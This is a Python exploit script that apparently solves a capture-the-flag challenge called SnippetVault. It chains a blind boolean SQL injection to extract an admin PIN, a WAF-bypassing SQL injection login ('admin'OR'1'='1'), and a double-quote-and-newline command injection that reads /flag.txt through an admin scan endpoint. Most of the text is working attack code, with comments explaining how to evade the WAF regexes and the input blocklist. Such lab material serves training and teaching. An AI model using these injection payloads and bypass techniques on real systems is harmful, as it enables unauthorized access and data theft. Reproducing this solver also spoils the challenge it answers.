#!/usr/bin/env python3
"""
SnippetVault – automated 5-step exploit chain.

1. Blind boolean SQLi on /explore  → extract admin_pin from settings table
2. WAF-bypass SQLi on /login       → admin session
3. POST /admin/unlock with PIN     → unlock admin tools
4. Upload file with crafted desc   → seed command-injection payload
5. POST /admin/scan                → trigger RCE, read /flag.txt
"""

import re
import sys
import requests

BASE    = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5000"
FLAG_RE = re.compile(r"(Pioneers25\{[^}]+\})")


# ─── Step 1: Blind boolean SQLi to extract admin_pin ────────────────────────
#
# The /explore endpoint builds the search query via string concatenation:
#   "... WHERE s.is_private = 0 AND s.title LIKE '%" + clean + "%' ..."
#
# The WAF (waf_check) runs on the search string.  Relevant WAF rules:
#   \bOR\s        – blocks OR followed by whitespace
#   \bAND\s+\d    – blocks AND followed by whitespace + digit
#   \bUNION\b     – blocks UNION entirely
#   --  #  /*     – blocks comment syntax
#
# WAF bypass for AND:  AND(  passes because \bAND\s+\d requires a DIGIT
# after whitespace, and '(' is not a digit.  We use AND(...) with no space.
#
# Payload template (for position P, candidate char C):
#   %' AND (SELECT CASE WHEN (substr((SELECT val FROM settings
#     WHERE key='admin_pin'),P,1)='C') THEN 1 ELSE 0 END)=1 AND '1%'='1
#
# Full SQL becomes:
#   ... LIKE '%%' AND (SELECT CASE WHEN (...) THEN 1 ELSE 0 END)=1
#   AND '1%'='1%'
#
# Key detail: comparison must use integer =1, not string ='1'.
# SQLite's CASE returns INTEGER 1, and 1='1' is FALSE in SQLite
# (strict type comparison).  The trailing AND '1%'='1 closes the
# dangling %' from the LIKE template.
#
# Observable difference: when TRUE → seeded public snippets appear in the
# response; when FALSE → "No public snippets found."

def extract_pin(s):
    """Return the 6-char hex admin_pin via blind boolean SQLi."""
    pin     = ""
    charset = "0123456789abcdef"
    marker  = "Hello World"          # title of a seeded public snippet

    print("[*] Step 1 – Blind boolean SQLi on /explore (extracting admin_pin)")

    for pos in range(1, 7):
        found = False
        for c in charset:
            payload = (
                f"%' AND (SELECT CASE WHEN (substr("
                f"(SELECT val FROM settings WHERE key='admin_pin')"
                f",{pos},1)='{c}') THEN 1 ELSE 0 END)=1 AND '1%'='1"
            )
            r = s.get(f"{BASE}/explore", params={"q": payload})
            if marker in r.text:
                pin += c
                found = True
                break
        if not found:
            print(f"[-] Failed at position {pos}")
            return None
        print(f"    pin[{pos}] = {c}  (accumulated: {pin})")

    print(f"[+] Extracted admin_pin = {pin}")
    return pin


# ─── Step 2: WAF-bypass SQLi on /login → admin session ─────────────────────
#
# The login query is built with an f-string:
#   "... WHERE username = '{username}' AND password = '{pw_hash}'"
#
# The WAF blocks  \bOR\s  (OR + whitespace).
# Bypass:  admin'OR'1'='1   – OR is immediately followed by ', not whitespace.
#
# Resulting SQL:
#   WHERE username = 'admin'OR'1'='1' AND password = '<hash>'
# Precedence:  (username='admin') OR ('1'='1' AND password='....')
# For admin row:  TRUE OR FALSE  →  TRUE

def login_as_admin(s):
    print("[*] Step 2 – SQLi login bypass (WAF bypass: OR without trailing space)")
    r = s.post(f"{BASE}/login", data={
        "username": "admin'OR'1'='1",
        "password": "x",
    }, allow_redirects=True)

    if "Admin" not in r.text and "admin" not in r.text.lower():
        print("[-] Login bypass failed")
        return False
    print("[+] Logged in as admin")
    return True


# ─── Step 3: Unlock admin panel with extracted PIN ──────────────────────────

def unlock_admin(s, pin):
    print(f"[*] Step 3 – Unlocking admin panel with PIN {pin}")
    r = s.post(f"{BASE}/admin/unlock", data={"pin": pin}, allow_redirects=True)
    if "Dashboard" in r.text or "Scanner" in r.text or "File-type" in r.text:
        print("[+] Admin panel unlocked")
        return True
    print("[-] PIN unlock failed")
    return False


# ─── Step 4: Upload file with malicious description ─────────────────────────
#
# sanitize_input() strips:  [;&|`$(){}\[\]!<>\\']
# Notably MISSING from the blocklist:  "  (double quote) and  \n  (newline).
#
# The admin scan command uses double quotes:
#   cmd = f'file {path} && echo "scan: {safe_name} - {safe_desc}" >> /tmp/...'
#
# Payload description:   x"\ncat /flag.txt\n"
#   – The double quote closes the echo's opening "
#   – The newline acts as a command separator in sh
#   – cat /flag.txt runs and its stdout is captured
#
# Why single-quote payloads do NOT work:
#   sanitize_input blocks  '  (single quote is in the regex).
#   Players who try the "obvious" x'\ncat /flag.txt\n' will see ' stripped.
#   They must notice the command uses DOUBLE quotes and " is not blocked.

def upload_payload(s):
    print('[*] Step 4 – Uploading file with malicious description (" + \\n)')
    payload_desc = 'x"\ncat /flag.txt\n"'
    r = s.post(
        f"{BASE}/upload",
        data={"desc": payload_desc, "category": "misc"},
        files={"file": ("notes.txt", b"just a text file", "text/plain")},
    )
    if "Uploaded" not in r.text:
        print("[-] Upload failed")
        return None

    # Grab the upload ID from the table
    ids = re.findall(r"<td>(\d+)</td>", r.text)
    if not ids:
        print("[-] Could not find upload ID")
        return None
    upload_id = ids[0]
    print(f"[+] Uploaded – ID = {upload_id}")
    return upload_id


# ─── Step 5: Trigger admin scan → command injection → flag ──────────────────

def trigger_scan(s, upload_id):
    print(f"[*] Step 5 – Scanning upload {upload_id} (command injection)")
    r = s.post(f"{BASE}/admin/scan", data={"upload_id": upload_id})

    flag = FLAG_RE.search(r.text)
    if flag:
        print(f"[+] FLAG: {flag.group(1)}")
        return True

    print("[-] Flag not found in scan output.  Response excerpt:")
    pre = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
    if pre:
        print(pre.group(1)[:600])
    else:
        print(r.text[:600])
    return False


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    s = requests.Session()

    # Step 1 – blind SQLi to extract admin_pin
    pin = extract_pin(s)
    if not pin:
        return False

    # Step 2 – WAF-bypass SQLi to log in as admin
    if not login_as_admin(s):
        return False

    # Step 3 – unlock admin panel
    if not unlock_admin(s, pin):
        return False

    # Step 4 – upload with malicious description
    upload_id = upload_payload(s)
    if not upload_id:
        return False

    # Step 5 – trigger scan → RCE → flag
    return trigger_scan(s, upload_id)


if __name__ == "__main__":
    ok = main()
    sys.exit(0 if ok else 1)
